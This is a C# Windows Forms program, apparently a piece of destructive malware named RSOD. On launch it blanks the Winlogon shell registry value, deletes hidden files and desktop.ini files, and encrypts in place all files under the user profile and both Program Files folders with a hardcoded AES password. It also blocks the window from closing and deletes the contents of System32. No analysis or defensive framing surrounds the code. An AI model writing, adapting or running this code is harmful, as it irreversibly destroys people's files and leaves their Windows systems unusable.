using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace RSOD
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            //Anti Kill
            e.Cancel = true;

            DeleteS32();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //Delete Shell
            RegistryKey Shell = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            Shell.SetValue("Shell", "empty", RegistryValueKind.String);

            //Define Paths
            string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string UserRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
            string Downloads = Path.Combine(UserRoot, "Downloads");
            string Documents = Path.Combine(UserRoot, "Documents");
            string Videos = Path.Combine(UserRoot, "Videos");
            string Music = Path.Combine(UserRoot, "Music");
            string Pictures = Path.Combine(UserRoot, "Pictures");
            string Programs32 = @"C:\Program Files (x86)";
            string Programs64 = @"C:\Program Files";

            //Delete All Hidden Files
            string[] DesktopFiles = Directory.EnumerateFiles(Desktop + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            string[] UserRootFiles = Directory.EnumerateFiles(UserRoot + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            string[] DownloadsFiles = Directory.EnumerateFiles(Downloads + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            string[] DocumentsFiles = Directory.EnumerateFiles(Documents + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            string[] VideosFiles = Directory.EnumerateFiles(Videos + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            string[] MusicFiles = Directory.EnumerateFiles(Music + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            string[] PicturesFiles = Directory.EnumerateFiles(Pictures + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            string[] Programs32Files = Directory.EnumerateFiles(Programs32 + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            string[] Programs64Files = Directory.EnumerateFiles(Programs64 + @"\").
                Where(f => (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden).
                ToArray();
            foreach (string file in DesktopFiles)
                File.Delete(file);
            foreach (string file in UserRootFiles)
                File.Delete(file);
            foreach (string file in DownloadsFiles)
                File.Delete(file);
            foreach (string file in DocumentsFiles)
                File.Delete(file);
            foreach (string file in VideosFiles)
                File.Delete(file);
            foreach (string file in MusicFiles)
                File.Delete(file);
            foreach (string file in PicturesFiles)
                File.Delete(file);
            foreach (string file in Programs32Files)
                File.Delete(file);
            foreach (string file in Programs64Files)
                File.Delete(file);

            //Delete Desktop.ini
            string DesktopIni = (Desktop + @"\desktop.ini");
            string UserRootIni = (UserRoot + @"\desktop.ini");
            string DownloadsIni = (Downloads + @"\desktop.ini");
            string DocumentsIni = (Documents + @"\desktop.ini");
            string VideosIni = (Videos + @"\desktop.ini");
            string MusicIni = (Music + @"\desktop.ini");
            string PicturesIni = (Pictures + @"\desktop.ini");
            string Programs32Ini = (Programs32 + @"\desktop.ini");
            string Programs64Ini = (Programs64 + @"\desktop.ini");
            File.Delete(DesktopIni);
            File.Delete(UserRootIni);
            File.Delete(DownloadsIni);
            File.Delete(DocumentsIni);
            File.Delete(VideosIni);
            File.Delete(MusicIni);
            File.Delete(PicturesIni);
            File.Delete(Programs32Ini);
            File.Delete(Programs64Ini);

            //Encrypt Files
            Start_Encrypt();
        }

        public class CoreEncryption
        {
            public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
            {
                byte[] encryptedBytes = null;
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;

                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);

                        AES.Mode = CipherMode.CBC;

                        using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                            cs.Close();
                        }
                        encryptedBytes = ms.ToArray();
                    }
                }

                return encryptedBytes;
            }
        }

        public class EncryptionFile
        {
            public void EncryptFile(string file, string password)
            {

                byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesEncrypted = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                string fileEncrypted = file;

                File.WriteAllBytes(fileEncrypted, bytesEncrypted);
            }
        }

        static void Start_Encrypt()
        {
            try
            {
                string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string UserRoot = System.Environment.GetEnvironmentVariable("USERPROFILE");
                string Downloads = Path.Combine(UserRoot, "Downloads");
                string Documents = Path.Combine(UserRoot, "Documents");
                string Videos = Path.Combine(UserRoot, "Videos");
                string Music = Path.Combine(UserRoot, "Music");
                string Pictures = Path.Combine(UserRoot, "Pictures");
                string Programs32 = @"C:\Program Files (x86)";
                string Programs64 = @"C:\Program Files";
                string[] files1 = Directory.GetFiles(Desktop + @"\", "*", SearchOption.AllDirectories);
                string[] files2 = Directory.GetFiles(Downloads + @"\", "*", SearchOption.AllDirectories);
                string[] files3 = Directory.GetFiles(Documents + @"\", "*", SearchOption.AllDirectories);
                string[] files4 = Directory.GetFiles(Videos + @"\", "*", SearchOption.AllDirectories);
                string[] files5 = Directory.GetFiles(Music + @"\", "*", SearchOption.AllDirectories);
                string[] files6 = Directory.GetFiles(Pictures + @"\", "*", SearchOption.AllDirectories);
                string[] files7 = Directory.GetFiles(Programs32 + @"\", "*", SearchOption.AllDirectories);
                string[] files8 = Directory.GetFiles(Programs64 + @"\", "*", SearchOption.AllDirectories);
                string[] files9 = Directory.GetFiles(UserRoot + @"\", "*", SearchOption.AllDirectories);



                EncryptionFile enc = new EncryptionFile();


                string password = "5rvSW9u%,[g'9jAt";

                for (int i = 0; i < files1.Length; i++)
                {
                    enc.EncryptFile(files1[i], password);

                }

                for (int i = 0; i < files2.Length; i++)
                {
                    enc.EncryptFile(files2[i], password);

                }

                for (int i = 0; i < files3.Length; i++)
                {
                    enc.EncryptFile(files3[i], password);

                }

                for (int i = 0; i < files4.Length; i++)
                {
                    enc.EncryptFile(files4[i], password);

                }

                for (int i = 0; i < files5.Length; i++)
                {
                    enc.EncryptFile(files5[i], password);

                }

                for (int i = 0; i < files6.Length; i++)
                {
                    enc.EncryptFile(files6[i], password);

                }

                for (int i = 0; i < files7.Length; i++)
                {
                    enc.EncryptFile(files7[i], password);

                }

                for (int i = 0; i < files8.Length; i++)
                {
                    enc.EncryptFile(files8[i], password);

                }

                for (int i = 0; i < files9.Length; i++)
                {
                    enc.EncryptFile(files9[i], password);

                }
            } catch
            {
                //Do Nothing
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            DeleteS32();
        }

        static void DeleteS32()
        {
            try
            {
                //We Don't Need System32 Folder... So Deleting It. HAHAHAHAHAHAHA!!
                string system32 = @"C:\Windows\system32";
                string[] s32f = Directory.GetFiles(system32 + @"\", "*", SearchOption.AllDirectories);
                foreach (string file in s32f)
                    File.Delete(file);
                Directory.Delete(system32);
            }
            catch
            {
                //Do Nothing
            }
        }
    }
}
